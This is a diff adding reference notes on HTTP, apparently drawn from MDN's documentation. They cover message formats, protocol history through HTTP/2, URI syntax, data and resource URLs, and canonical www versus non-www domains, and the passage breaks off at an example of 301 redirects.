@@ -1,0 +1,2169 @@
+HTTP:
+    Hypertext Transfer Protocol (HTTP) is an application-layer protocol for transmitting hypermedia documents, such as HTML. It was designed for communication between web browsers and web servers, but it can also be used for other purposes. HTTP follows a classical client-server model, with a client opening a connection to make a request, then waiting until it receives a response. HTTP is a stateless protocol, meaning that the server does not keep any data (state) between two requests. Though often based on a TCP/IP layer, it can be used on any reliable transport layer, that is, a protocol that doesn't lose messages silently like UDP does. RUDP — the reliable update of UDP — is a suitable alternative.
+
+Basics of HTTP:
+    An overview of HTTP:
+        HTTP is a protocol which allows the fetching of resources, such as HTML documents. It is the foundation of any data exchange on the Web and it is a client-server protocol, which means requests are initiated by the recipient, usually the Web browser. A complete document is reconstructed from the different sub-documents fetched, for instance text, layout description, images, videos, scripts, and more.
+
+        Clients and servers communicate by exchanging individual messages (as opposed to a stream of data). The messages sent by the client, usually a Web browser, are called requests and the messages sent by the server as an answer are called responses.
+
+        Designed in the early 1990s, HTTP is an extensible protocol which has evolved over time. It is an application layer protocol that is sent over TCP, or over a TLS-encrypted TCP connection, though any reliable transport protocol could theoretically be used. Due to its extensibility, it is used to not only fetch hypertext documents, but also images and videos or to post content to servers, like with HTML form results. HTTP can also be used to fetch parts of documents to update Web pages on demand.
+
+        Components of HTTP-based systems:
+            HTTP is a client-server protocol: requests are sent by one entity, the user-agent (or a proxy on behalf of it). Most of the time the user-agent is a Web browser, but it can be anything, for example a robot that crawls the Web to populate and maintain a search engine index.
+
+            Each individual request is sent to a server, which handles it and provides an answer, called the response. Between the client and the server there are numerous entities, collectively called proxies, which perform different operations and act as gateways or caches, for example.
+
+            In reality, there are more computers between a browser and the server handling the request: there are routers, modems, and more. Thanks to the layered design of the Web, these are hidden in the network and transport layers. HTTP is on top, at the application layer. Although important to diagnose network problems, the underlying layers are mostly irrelevant to the description of HTTP.
+
+            Client: the user-agent:
+                The user-agent is any tool that acts on the behalf of the user. This role is primarily performed by the Web browser; other possibilities are programs used by engineers and Web developers to debug their applications.
+
+                The browser is always the entity initiating the request. It is never the server (though some mechanisms have been added over the years to simulate server-initiated messages).
+
+                To present a Web page, the browser sends an original request to fetch the HTML document that represents the page. It then parses this file, making additional requests corresponding to execution scripts, layout information (CSS) to display, and sub-resources contained within the page (usually images and videos). The Web browser then mixes these resources to present to the user a complete document, the Web page. Scripts executed by the browser can fetch more resources in later phases and the browser updates the Web page accordingly.
+
+                A Web page is a hypertext document. This means some parts of displayed text are links which can be activated (usually by a click of the mouse) to fetch a new Web page, allowing the user to direct their user-agent and navigate through the Web. The browser translates these directions in HTTP requests, and further interprets the HTTP responses to present the user with a clear response.
+
+            The Web server:
+                On the opposite side of the communication channel, is the server, which serves the document as requested by the client. A server appears as only a single machine virtually: this is because it may actually be a collection of servers, sharing the load (load balancing) or a complex piece of software interrogating other computers (like cache, a DB server, or e-commerce servers), totally or partially generating the document on demand.
+
+                A server is not necessarily a single machine, but several server software instances can be hosted on the same machine. With HTTP/1.1 and the Host header, they may even share the same IP address.
+
+            Proxies:
+                Between the Web browser and the server, numerous computers and machines relay the HTTP messages. Due to the layered structure of the Web stack, most of these operate at the transport, network or physical levels, becoming transparent at the HTTP layer and potentially making a significant impact on performance. Those operating at the application layers are generally called proxies. These can be transparent, forwarding on the requests they receive without altering them in any way, or non-transparent, in which case they will change the request in some way before passing it along to the server. Proxies may perform numerous functions:
+                    - caching (the cache can be public or private, like the browser cache)
+
+                    - filtering (like an antivirus scan or parental controls)
+
+                    - load balancing (to allow multiple servers to serve the different requests)
+
+                    - authentication (to control access to different resources)
+
+                    - logging (allowing the storage of historical information)
+
+        Basic aspects of HTTP:
+            HTTP is simple:
+                HTTP is generally designed to be simple and human readable, even with the added complexity introduced in HTTP/2 by encapsulating HTTP messages into frames. HTTP messages can be read and understood by humans, providing easier testing for developers, and reduced complexity for newcomers.
+
+            HTTP is extensible:
+                Introduced in HTTP/1.0, HTTP headers make this protocol easy to extend and experiment with. New functionality can even be introduced by a simple agreement between a client and a server about a new header's semantics.
+
+            HTTP is stateless, but not sessionless:
+                HTTP is stateless: there is no link between two requests being successively carried out on the same connection. This immediately has the prospect of being problematic for users attempting to interact with certain pages coherently, for example, using e-commerce shopping baskets. But while the core of HTTP itself is stateless, HTTP cookies allow the use of stateful sessions. Using header extensibility, HTTP Cookies are added to the workflow, allowing session creation on each HTTP request to share the same context, or the same state.
+
+            HTTP and connections:
+                A connection is controlled at the transport layer, and therefore fundamentally out of scope for HTTP. Though HTTP doesn't require the underlying transport protocol to be connection-based; only requiring it to be reliable, or not lose messages (so at minimum presenting an error). Among the two most common transport protocols on the Internet, TCP is reliable and UDP isn't. HTTP therefore relies on the TCP standard, which is connection-based.
+
+                Before a client and server can exchange an HTTP request/response pair, they must establish a TCP connection, a process which requires several round-trips. The default behavior of HTTP/1.0 is to open a separate TCP connection for each HTTP request/response pair. This is less efficient than sharing a single TCP connection when multiple requests are sent in close succession.
+
+                In order to mitigate this flaw, HTTP/1.1 introduced pipelining (which proved difficult to implement) and persistent connections: the underlying TCP connection can be partially controlled using the Connection header. HTTP/2 went a step further by multiplexing messages over a single connection, helping keep the connection warm and more efficient.
+
+                Experiments are in progress to design a better transport protocol more suited to HTTP. For example, Google is experimenting with QUIC which builds on UDP to provide a more reliable and efficient transport protocol.
+
+        What can be controlled by HTTP:
+            This extensible nature of HTTP has, over time, allowed for more control and functionality of the Web. Cache or authentication methods were functions handled early in HTTP history. The ability to relax the origin constraint, by contrast, has only been added in the 2010s.
+
+            Here is a list of common features controllable with HTTP.
+                Caching:
+                    How documents are cached can be controlled by HTTP. The server can instruct proxies and clients, about what to cache and for how long. The client can instruct intermediate cache proxies to ignore the stored document.
+
+                Relaxing the origin constraint:
+                    To prevent snooping and other privacy invasions, Web browsers enforce strict separation between Web sites. Only pages from the same origin can access all the information of a Web page. Though such constraint is a burden to the server, HTTP headers can relax this strict separation on the server side, allowing a document to become a patchwork of information sourced from different domains; there could even be security-related reasons to do so.
+
+                Authentication:
+                    Some pages may be protected so that only specific users can access them. Basic authentication may be provided by HTTP, either using the WWW-Authenticate and similar headers, or by setting a specific session using HTTP cookies.
+
+                Proxy and tunneling:
+                    Servers or clients are often located on intranets and hide their true IP address from other computers. HTTP requests then go through proxies to cross this network barrier. Not all proxies are HTTP proxies. The SOCKS protocol, for example, operates at a lower level. Other protocols, like ftp, can be handled by these proxies.
+
+                Sessions:
+                    Using HTTP cookies allows you to link requests with the state of the server. This creates sessions, despite basic HTTP being a state-less protocol. This is useful not only for e-commerce shopping baskets, but also for any site allowing user configuration of the output.
+
+        HTTP flow:
+            When a client wants to communicate with a server, either the final server or an intermediate proxy, it performs the following steps:
+                1. Open a TCP connection: The TCP connection is used to send a request, or several, and receive an answer. The client may open a new connection, reuse an existing connection, or open several TCP connections to the servers.
+
+                2. Send an HTTP message: HTTP messages (before HTTP/2) are human-readable. With HTTP/2, these simple messages are encapsulated in frames, making them impossible to read directly, but the principle remains the same. For example:
+                    GET / HTTP/1.1
+                    Host: developer.mozilla.org
+                    Accept-Language: fr
+
+                3. Read the response sent by the server, such as:
+                    HTTP/1.1 200 OK
+                    Date: Sat, 09 Oct 2010 14:28:02 GMT
+                    Server: Apache
+                    Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
+                    ETag: "51142bc1-7449-479b075b2891b"
+                    Accept-Ranges: bytes
+                    Content-Length: 29769
+                    Content-Type: text/html
+
+                    <!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
+
+                4. Close or reuse the connection for further requests.
+
+            If HTTP pipelining is activated, several requests can be sent without waiting for the first response to be fully received. HTTP pipelining has proven difficult to implement in existing networks, where old pieces of software coexist with modern versions. HTTP pipelining has been superseded in HTTP/2 with more robust multiplexing requests within a frame.
+
+        HTTP Messages:
+            HTTP messages, as defined in HTTP/1.1 and earlier, are human-readable. In HTTP/2, these messages are embedded into a binary structure, a frame, allowing optimizations like compression of headers and multiplexing. Even if only part of the original HTTP message is sent in this version of HTTP, the semantics of each message is unchanged and the client reconstitutes (virtually) the original HTTP/1.1 request. It is therefore useful to comprehend HTTP/2 messages in the HTTP/1.1 format.
+
+            There are two types of HTTP messages, requests and responses, each with its own format.
+
+            Requests:
+                Requests consists of the following elements:
+                    - An HTTP method, usually a verb like GET, POST or a noun like OPTIONS or HEAD that defines the operation the client wants to perform. Typically, a client wants to fetch a resource (using GET) or post the value of an HTML form (using POST), though more operations may be needed in other cases.
+
+                    - The path of the resource to fetch; the URL of the resource stripped from elements that are obvious from the context, for example without the protocol (http://), the domain (here, developer.mozilla.org), or the TCP port (here, 80).
+
+                    - The version of the HTTP protocol.
+
+                    - Optional headers that convey additional information for the servers.
+
+                    - Or a body, for some methods like POST, similar to those in responses, which contain the resource sent.
+
+            Responses:
+                Responses consist of the following elements:
+                    - The version of the HTTP protocol they follow.
+                    - A status code, indicating if the request was successful, or not, and why.
+                    - A status message, a non-authoritative short description of the status code.
+                    - HTTP headers, like those for requests.
+                    - Optionally, a body containing the fetched resource.
+
+        APIs based on HTTP:
+            The most commonly used API based on HTTP is the XMLHttpRequest API, which can be used to exchange data between a user agent and a server. The modern Fetch API provides the same features with a more powerful and flexible feature set.
+
+            Another API, server-sent events, is a one-way service that allows a server to send events to the client, using HTTP as a transport mechanism. Using the EventSource interface, the client opens a connection and establishes event handlers. The client browser automatically converts the messages that arrive on the HTTP stream into appropriate Event objects, delivering them to the event handlers that have been registered for the events' type if known, or to the onmessage event handler if no type-specific event handler was established.
+
+        Conclusion:
+            HTTP is an extensible protocol that is easy to use. The client-server structure, combined with the ability to simply add headers, allows HTTP to advance along with the extended capabilities of the Web.
+
+            Though HTTP/2 adds some complexity, by embedding HTTP messages in frames to improve performance, the basic structure of messages has stayed the same since HTTP/1.0. Session flow remains simple, allowing it to be investigated, and debugged with a simple HTTP message monitor.
+
+    Evolution of HTTP:
+        HTTP (HyperText Transfer Protocol) is the underlying protocol of the World Wide Web. Developed by Tim Berners-Lee and his team between 1989-1991, HTTP has seen many changes, keeping most of the simplicity and further shaping its flexibility. HTTP has evolved from an early protocol to exchange files in a semi-trusted laboratory environment, to the modern maze of the Internet, now carrying images, videos in high resolution and 3D.
+
+        Invention of the World Wide Web:
+            In 1989, while he was working at CERN, Tim Berners-Lee wrote a proposal to build a hypertext system over the Internet. Initially calling it the Mesh, it was later renamed to World Wide Web during its implementation in 1990. Built over the existing TCP and IP protocols, it consisted of 4 building blocks:
+                - A textual format to represent hypertext documents, the HyperText Markup Language (HTML).
+
+                - A simple protocol to exchange these documents, the HypertText Transfer Protocol (HTTP).
+
+                - A client to display (and accidentally edit) these documents, the first Web browser called WorldWideWeb.
+
+                - A server to give access to the document, an early version of httpd.
+
+            These four building blocks were completed by the end of 1990, and the first servers were already running outside of CERN by early 1991. On August 6th 1991, Tim Berners-Lee's post on the public alt.hypertext newsgroup is now considered as the official start of the World Wide Web as a public project.
+
+            The HTTP protocol used in those early phases was very simple, later dubbed HTTP/0.9, and sometimes as the one-line protocol.
+
+        HTTP/0.9 – The one-line protocol:
+            The initial version of HTTP had no version number; it has been later called 0.9 to differentiate it from the later versions. HTTP/0.9 is extremely simple: requests consist of a single line and start with the only possible method GET followed by the path to the resource (not the URL as both the protocol, server, and port are unnecessary once connected to the server).
+                GET /mypage.html
+
+            The response is extremely simple too: it only consisted of the file itself.
+                <HTML>
+                    A very simple HTML page
+                </HTML>
+
+            Unlike subsequent evolutions, there were no HTTP headers, meaning that only HTML files could be transmitted, but no other type of documents. There were no status or error codes: in case of a problem, a specific HTML file was send back with the description of the problem contained in it, for human consumption.
+
+            HTTP/0.9 was very limited and both browsers and servers quickly extended it to be more versatile:
+
+        HTTP/1.0 – Building extensibility:
+            Versioning information is now sent within each request (HTTP/1.0 is appended to the GET line)
+                - A status code line is also sent at the beginning of the response, allowing the browser itself to understand the success or failure of the request and to adapt its behavior in consequence (like in updating or using its local cache in a specific way)
+
+                - The notion of HTTP headers has been introduced, both for the requests and the responses, allowing metadata to be transmitted and making the protocol extremely flexible and extensible.
+
+                - With the help of the new HTTP headers, the ability to transmit other documents than plain HTML files has been added (thanks to the Content-Type header).
+
+            At this point, a typical request and response looked like this:
+                GET /mypage.html HTTP/1.0
+                User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)
+
+                200 OK
+                Date: Tue, 15 Nov 1994 08:12:31 GMT
+                Server: CERN/3.0 libwww/2.17
+                Content-Type: text/html
+                <HTML>
+                A page with an image
+                  <IMG SRC="/myimage.gif">
+                </HTML>
+
+            Followed by a second connection and request to fetch the image (followed by a response to  that request):
+                GET /myimage.gif HTTP/1.0
+                User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)
+
+                200 OK
+                Date: Tue, 15 Nov 1994 08:12:32 GMT
+                Server: CERN/3.0 libwww/2.17
+                Content-Type: text/gif
+                (image content)
+
+            These novelties have not been introduced as concerted effort, but as a try-and-see approach over the 1991-1995 period: a server and a browser added one feature and it saw if it got traction. A lot of interoperability problems were common. In November 1996, in order to solve these annoyances, an informational document describing the common practices has been published, RFC 1945. This is the definition of HTTP/1.0 and it is notable that, in the narrow sense of the term, it isn't an official standard.
+
+        HTTP/1.1 – The standardized protocol:
+            In parallel to the somewhat chaotic use of the diverse implementations of HTTP/1.0, and since 1995, well before the publication of HTTP/1.0 document the next year, proper standardization was in progress. The first standardized version of HTTP, HTTP/1.1 was published in early 1997, only a few months after HTTP/1.0.
+
+            HTTP/1.1 clarified ambiguities and introduced numerous improvements:
+                - A connection can be reused, saving the time to reopen it numerous times to display the resources embedded into the single original document retrieved.
+
+                - Pipelining has been added, allowing to send a second request before the answer for the first one is fully transmitted, lowering the latency of the communication.
+
+                - Chunked responses are now also supported.
+
+                - Additional cache control mechanisms have been introduced.
+
+                - Content negotiation, including language, encoding, or type, has been introduced, and allows a client and a server to agree on the most adequate content to exchange.
+
+                - Thanks to the Host header, the ability to host different domains at the same IP address now allows server colocation.
+
+            A typical flow of requests, all through one single connection is now looking like this:
+                GET /en-US/docs/Glossary/Simple_header HTTP/1.1
+                Host: developer.mozilla.org
+                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                Accept-Language: en-US,en;q=0.5
+                Accept-Encoding: gzip, deflate, br
+                Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header
+
+                200 OK
+                Connection: Keep-Alive
+                Content-Encoding: gzip
+                Content-Type: text/html; charset=utf-8
+                Date: Wed, 20 Jul 2016 10:55:30 GMT
+                Etag: "547fa7e369ef56031dd3bff2ace9fc0832eb251a"
+                Keep-Alive: timeout=5, max=1000
+                Last-Modified: Tue, 19 Jul 2016 00:59:33 GMT
+                Server: Apache
+                Transfer-Encoding: chunked
+                Vary: Cookie, Accept-Encoding
+
+                (content)
+
+
+                GET /static/img/header-background.png HTTP/1.1
+                Host: developer.cdn.mozilla.net
+                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
+                Accept: */*
+                Accept-Language: en-US,en;q=0.5
+                Accept-Encoding: gzip, deflate, br
+                Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header
+
+                200 OK
+                Age: 9578461
+                Cache-Control: public, max-age=315360000
+                Connection: keep-alive
+                Content-Length: 3077
+                Content-Type: image/png
+                Date: Thu, 31 Mar 2016 13:34:46 GMT
+                Last-Modified: Wed, 21 Oct 2015 18:27:50 GMT
+                Server: Apache
+
+                (image content of 3077 bytes)
+
+            HTTP/1.1 was first published as RFC 2068 in January 1997.
+
+        More than 15 years of extensions:
+            Thanks to its extensibility – creating new headers or methods is easy – and even if the HTTP/1.1 protocol was refined over two revisions, RFC 2616 published in June 1999 and the series of RFC 7230-RFC 7235 published in June 2014 in prevision of the release of HTTP/2, this protocol has been extremely stable over more than 15 years.
+
+            Using HTTP for secure transmissions:
+                The largest change that happened to HTTP was done as early as end of 1994. Instead of sending HTTP over a basic TCP/IP stack, Netscape Communication created an additional encrypted transmission layer on top of it: SSL. SSL 1.0 was never released outside the companies, but SSL 2.0 and its successors SSL 3.0 and SSL 3.1 allowed for the creation of e-commerce Web sites by encrypting and guaranteeing the authenticity of the messages exchanged between the server and client. SSL was put on the standards track and eventually became TLS, with version 1.0, 1.1, and 1.2 appearing successfully to close vulnerabilities. TLS 1.3 is currently in the making.
+
+                During the same time, the need for an encrypted transport layer raised: the Web left the relative trustiness of a mostly academic network, to a jungle where advertisers, random individuals or criminals compete to get as much private information about people, try to impersonate them or even to replace data transmitted by altered ones. As the applications built over HTTP became more and more powerful, having access to more and more private information like address books, e-mail, or the geographic position of the user, the need to have TLS became ubiquitous even outside the e-commerce use case.
+
+            Using HTTP for complex applications:
+                The original vision of Tim Berners-Lee for the Web wasn't a read-only medium. He envisioned a Web where people can add and move documents remotely, a kind of distributed file system. Around 1996, HTTP has been extended to allow authoring, and a standard called WebDAV was created. It has been further extended for specific applications like CardDAV to handle address book entries and CalDAV to deal with calendars. But all these *DAV extensions had a flaw: they had to be implemented by the servers to be used, which was quite complex. Their use on Web realms stayed confidential.
+
+                In 2000, a new pattern for using HTTP was designed: representational state transfer (or REST). The actions induced by the API were no more conveyed by new HTTP methods, but only by accessing specific URIs with basic HTTP/1.1 methods. This allowed any Web application to provide an API to allow retrieval and modification of its data without having to update the browsers or the servers: all what is needed was embedded in the files served by the Web sites through standard HTTP/1.1. The drawback of the REST model resides in the fact that each website defines its own non-standard RESTful API and has total control on it; unlike the *DAV extensions were clients and servers are interoperable. RESTful APIs became very common in the 2010s.
+
+                Since 2005, the set of APIs available to Web pages greatly increased and several of these APIs created extensions, mostly new specific HTTP headers, to the HTTP protocol for specific purposes:
+
+                    - Server-sent events, where the server can push occasional messages to the browser.
+
+                    - WebSocket, a new protocol that can be set up by upgrading an existing HTTP connection.
+
+            Relaxing the security-model of the Web:
+                HTTP is independent of the security model of the Web, the same-origin policy. In fact, the current Web security model has been developed after the creation of HTTP! Over the years, it has proved useful to be able to be more lenient, by allowing under certain constraints to lift some of the restriction of this policy. How much and when such restrictions are lifted is transmitted by the server to the client using a new bunch of HTTP headers. These are defined in specifications like Cross-Origin Resource Sharing (CORS) or the Content Security Policy (CSP).
+
+                In addition to these large extensions, numerous other headers have been added, sometimes experimentally only. Notable headers are Do Not Track (DNT) header to control privacy, X-Frame-Options, or Upgrade-Insecure-Requests but many more exist.
+
+        HTTP/2 – A protocol for greater performance:
+            Over the years, Web pages have become much more complex, even becoming applications in their own right. The amount of visual media displayed, the volume and size of scripts adding interactivity, has also increased: much more data is transmitted over significantly more HTTP requests. HTTP/1.1 connections need requests sent in the correct order. Theoretically, several parallel connections could be used (typically between 5 and 8), bringing considerable overhead and complexity. For example, HTTP pipelining has emerged as a resource burden in Web development.
+
+            In the first half of the 2010s, Google demonstrated an alternative way of exchanging data between client and server, by implementing an experimental protocol SPDY. This amassed interest from developers working on both browsers and servers. Defining an increase in responsiveness, and solving the problem of duplication of data transmitted, SPDY served as the foundations of the HTTP/2 protocol.
+
+            The HTTP/2 protocol has several prime differences from the HTTP/1.1 version:
+                - It is a binary protocol rather than text. It can no longer be read and created manually.  Despite this hurdle, improved optimization techniques can now be implemented.
+
+                - It is a multiplexed protocol. Parallel requests can be handled over the same connection, removing the order and blocking constraints of the HTTP/1.x protocol.
+
+                - It compresses headers. As these are often similar among a set of requests, this removes duplication and overhead of data transmitted.
+
+                - It allows a server to populate data in a client cache, in advance of it being required, through a mechanism called the server push.
+
+            Officially standardized, in May 2015, HTTP/2 has had much success. By July 2016, 8.7% of all Web sites[1] were already using it, representing more than 68% of all requests[2]. High-traffic Web sites showed the most rapid adoption, saving considerably on data transfer overheads and subsequent budgets.
+
+            This rapid adoption rate was likely as HTTP/2 does not require adaptation of Web sites and applications: using HTTP/1.1 or HTTP/2 is transparent for them. Having an up-to-date server communicating with a recent browser is enough to enable its use: only a limited set of groups were needed to trigger adoption, and as legacy browser and server versions are renewed, usage has naturally increased, without further Web developer efforts.
+
+        Post-HTTP/2 evolution:
+            HTTP didn't stop evolving upon the release of HTTP/2. Like with HTTP/1.x previously, HTTP's extensibility is still being used to add new features. Notably, we can cite new extensions of the HTTP protocol appearing in 2016:
+                - Support of Alt-Svc allows the dissociation of the identification and the location of a given resource, allowing for a smarter CDN caching mechanism.
+
+                - The introduction of Client-Hints allows the browser, or client, to proactively communicate information about its requirements, or hardware constraints, to the server.
+
+                - The introduction of security-related prefixes in the Cookie header, now helps guarantee a secure cookie has not been altered.
+
+            This evolution of HTTP proves its extensibility and simplicity, liberating creation of many applications and compelling the adoption of the protocol. The environment in which HTTP is used today is quite different from that seen in the early 1990s. HTTP's original design proved to be a masterpiece, allowing the Web to evolve over a quarter of a century, without the need of a mutiny. By healing flaws, yet retaining the flexibility and extensibility which made HTTP such a success, the adoption of HTTP/2 hints at a bright future for the protocol.
+
+    Identifying resources on the Web:
+        The target of an HTTP request is called a "resource", whose nature isn't defined further; it can be a document, a photo, or anything else. Each resource is identified by a Uniform Resource Identifier (URI) used throughout HTTP for identifying resources.
+
+        The identity and the location of resources on the Web are mostly given by a single URL (Uniform Resource Locator, a kind of URI). There are sometimes reasons identity and location are not given by the same URI: HTTP uses a specific HTTP header, Alt-Svc when the resource requested wants the client to access it at another location.
+
+        URLs and URNs:
+            URLs:
+                The most common form of URI is the Uniform Resource Locator (URL), which is known as the web address.
+                    https://developer.mozilla.org
+                    https://developer.mozilla.org/en-US/docs/Learn/
+                    https://developer.mozilla.org/en-US/search?q=URL
+
+                Any of those URLs can be typed into your browser's address bar to tell it to load the associated page (resource).
+
+                A URL is composed of different parts, some mandatory and others are optional. A more complex example might look like this:
+                    http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument
+
+            URNs:
+                A Uniform Resource Name (URN) is a URI that identifies a resource by name in a particular namespace.
+                    urn:isbn:9780141036144
+                    urn:ietf:rfc:7230
+
+                The two URNs correspond to
+                    - the book Nineteen Eighty-Four by George Orwell,
+
+                    - the IETF specification 7230, Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing.
+
+        Syntax of Uniform Resource Identifiers (URIs):
+            Scheme or protocol:
+                http:// is the protocol. It indicates which protocol the browser must use. Usually it is the HTTP protocol or its secured version, HTTPS. The Web requires one of these two, but browsers also know how to handle other protocols such as mailto: (to open a mail client) or ftp: to handle file transfer, so don't be surprised if you see such protocols. Common schemes are:
+
+                    | Scheme      | Description
+                    |-------------|-----------------------------------------
+                    | data        | Data URIs
+                    | file        | Host-specific file names
+                    | ftp         | File Transfer Protocol
+                    | http/https  | Hyper text transfer protocol (Secure)
+                    | mailto      | Electronic mail address
+                    | ssh         | Secure shell
+                    | tel         | telephone
+                    | urn         | Uniform Resource Names
+                    | view-source | Source code of the resource
+                    | ws/wss      | (Encrypted) WebSocket connections
+
+            Authority:
+                www.example.com is the domain name or authority that governs the namespace. It indicates which Web server is being requested. Alternatively, it is possible to directly use an IP address, but because it is less convenient, it is not often used on the Web.
+
+            Port:
+                :80 is the port in this instance. It indicates the technical "gate" used to access the resources on the web server. It is usually omitted if the web server uses the standard ports of the HTTP protocol (80 for HTTP and 443 for HTTPS) to grant access to its resources. Otherwise it is mandatory.
+
+            Path:
+                /path/to/myfile.html is the path to the resource on the Web server. In the early days of the Web, a path like this represented a physical file location on the Web server. Nowadays, it is mostly an abstraction handled by Web servers without any physical reality.
+
+            Query:
+                ?key1=value1&key2=value2 are extra parameters provided to the Web server. Those parameters are a list of key/value pairs separated with the & symbol. The Web server can use those parameters to do extra stuff before returning the resource to the user. Each Web server has its own rules regarding parameters, and the only reliable way to know how a specific Web server is handling parameters is by asking the Web server owner.
+
+            Fragment:
+                #SomewhereInTheDocument is an anchor to another part of the resource itself. An anchor represents a sort of "bookmark" inside the resource, giving the browser the directions to show the content located at that "bookmarked" spot. On an HTML document, for example, the browser will scroll to the point where the anchor is defined; on a video or audio document, the browser will try to go to the time the anchor represents. It is worth noting that the part after the #, also known as fragment identifier, is never sent to the server with the request.
+
+        Usage notes:
+            When using URLs in HTML content, you should generally only use a few of these URL schemes. When referring to subresources — that is, files that are being loaded as part of a larger document — you should only use the HTTP and HTTPS schemes. Increasingly, browsers are removing support for using FTP to load subresources, for security reasons.
+
+            FTP is still acceptable at the top level (such as typed directly into the browser's URL bar, or the target of a link), although some browsers may delegate loading FTP content to another application.
+
+    Data URLs:
+        Data URLs, URLs prefixed with the data: scheme, allow content creators to embed small files inline in documents.
+
+        Note: Data URLs are treated as unique opaque origins by modern browsers, rather than inheriting the origin of the settings object responsible for the navigation.
+
+        Syntax:
+            Data URLs are composed of four parts: a prefix (data:), a MIME type indicating the type of data, an optional base64 token if non-textual, and the data itself:
+                data:[<mediatype>][;base64],<data>
+
+            The mediatype is a MIME type string, such as 'image/jpeg' for a JPEG image file. If omitted, defaults to text/plain;charset=US-ASCII
+
+            If the data is textual, you can simply embed the text (using the appropriate entities or escapes based on the enclosing document's type). Otherwise, you can specify base64 to embed base64-encoded binary data. You can find more info on MIME types here and here.
+
+            A few examples:
+                data:,Hello%2C%20World!
+                    Simple text/plain data
+
+                data:text/plain;base64,SGVsbG8sIFdvcmxkIQ%3D%3D
+                    base64-encoded version of the above
+
+                data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E
+                    An HTML document with <h1>Hello, World!</h1>
+
+                data:text/html,<script>alert('hi');</script>
+                    An HTML document that executes a JavaScript alert. Note that the closing script tag is required.
+
+        Encoding data into base64 format:
+            Base64 is a group of binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. By consisting only in ASCII characters, base64 strings are generally url-safe, and that's why they can be used to encode data in Data URLs.
+
+            Encoding in Javascript:
+                The Web APIs have native methods to encode or decode to base64.
+
+            Encoding on a Unix system:
+                Base64 encoding of a file or string on Linux and Mac OS X systems can be achieved using the command-line base64 (or, as an alternative, the uuencode utility with -m argument).
+
+                    echo -n hello|base64
+                    # outputs to console: aGVsbG8=
+
+                    echo -n hello>a.txt
+                    base64 a.txt
+                    # outputs to console: aGVsbG8=
+
+                    base64 a.txt>b.txt
+                    # outputs to file b.txt: aGVsbG8=
+
+            Encoding on Microsoft Windows:
+                Encoding on Windows can be done through powershell or some dedicated tool. It can even be done via bash base64 utility (see section Encoding on a Unix system) if WSL is activated.
+                    [convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
+                    # outputs to console: aGVsbG8=
+
+                    bash -c "echo -n hello`|base64"
+                    # outputs to console: aGVsbG8=
+                    # the backtick (`) is used to escape the piping (|) character here
+
+        Common problems:
+            Syntax:
+                The format for data URLs is very simple, but it's easy to forget to put a comma before the "data" segment, or to incorrectly encode the data into base64 format.
+
+            Formatting in HTML:
+                A data URL provides a file within a file, which can potentially be very wide relative to the width of the enclosing document. As a URL, the data should be formatable with whitespace (linefeed, tab, or spaces), but there are practical issues that arise when using base64 encoding.
+
+            Length limitations:
+                Although Firefox supports data URLs of essentially unlimited length, browsers are not required to support any particular maximum length of data. For example, the Opera 11 browser limited URLs to 65535 characters long which limits data URLs to 65529 characters (65529 characters being the length of the encoded data, not the source, if you use the plain data:, without specifying a MIME type).
+
+            Lack of error handling:
+                Invalid parameters in media, or typos when specifying 'base64', are ignored, but no error is provided.
+
+            No support for query strings, etc.:
+                The data portion of a data URL is opaque, so an attempt to use a query string (page-specific parameters, with the syntax <url>?parameter-data) with a data URL will just include the query string in the data the URL represents.
+
+            Security issues:
+                A number of security issues (e.g. phishing) have been associated with data URLs, and navigating to them in the browser's top level. To mitigate such issues, top-level navigation to data:// URIs has been blocked in Firefox 59+ (release version, Nightly/Beta from 58), and we hope to see other browsers follow suit soon. See Blocking Top-Level Navigations to data URLs for Firefox 58 for more details.
+
+    Resource URLs:
+        Non-standard: This feature is non-standard and is not on a standards track. Do not use it on production sites facing the Web: it will not work for every user. There may also be large incompatibilities between implementations and the behavior may change in the future.
+
+        Resource URLs, URLs prefixed with the resource: scheme, are used by Firefox and Firefox browser extensions to load resources internally, but some of the information is available to sites the browser connects to as well.
+
+        Syntax:
+            Resource URLs are composed of two parts: a prefix (resource:), and a URL pointing to the resource you want to load:
+                resource://<url>
+
+            An example:
+                resource://gre/res/svg.css
+
+            When arrows are found in the resource URL's ('->'), it means that the first file loaded the next one:
+                resource://<File-loader> -> <File-loaded>
+
+            Please refer to Identifying resources on the web for more general details.
+
+            In this article, we focus on resource URIs, which are used internally by Firefox to point to built-in resources.
+
+    Choosing between www and non-www URLs:
+        So, do I have to choose one or the other for my web site?
+            - Yes, you need to choose one and stick with it. The choice of which one to have as your canonical location is yours, but if you choose one, stick with it. It will make your website appear more consistent to your users and to search engines. This includes always linking to the chosen domain (which shouldn't be hard if you're using relative URLs in your website) and always sharing links (by email/social networks, etc.) to the same domain.
+
+            - No, you can have two. What is important is that you are coherent and consistent with which one is the official domain. This official domain is called the canonical name. All your absolute links should use it. But even so, you can still have the other domain working: HTTP allows two techniques so that it is clear for your users, or search engines, which domain is the canonical one, while still allowing the non-canonical domain to work and provide the expected pages.
+
+        So, choose one of your domains as your canonical one! There are two techniques below to allow the non-canonical domain to work still.
+
+        Techniques for canonical URLs:
+            There are different ways to choose which website is canonical.
+
+            Using HTTP 301 redirects:
+                In this case, you need to configure the server receiving the HTTP requests (which is most likely the same for www and non-www URLs) to respond with an adequate HTTP 301 response to any request to the non-canonical domain. This will redirect the browser trying to access the non-canonical URLs to their canonical equivalent. For example, if you've chosen to use non-www URLs as the canonical type, you should redirect all www URLs to their equivalent URL without the www.
+
+                Example:
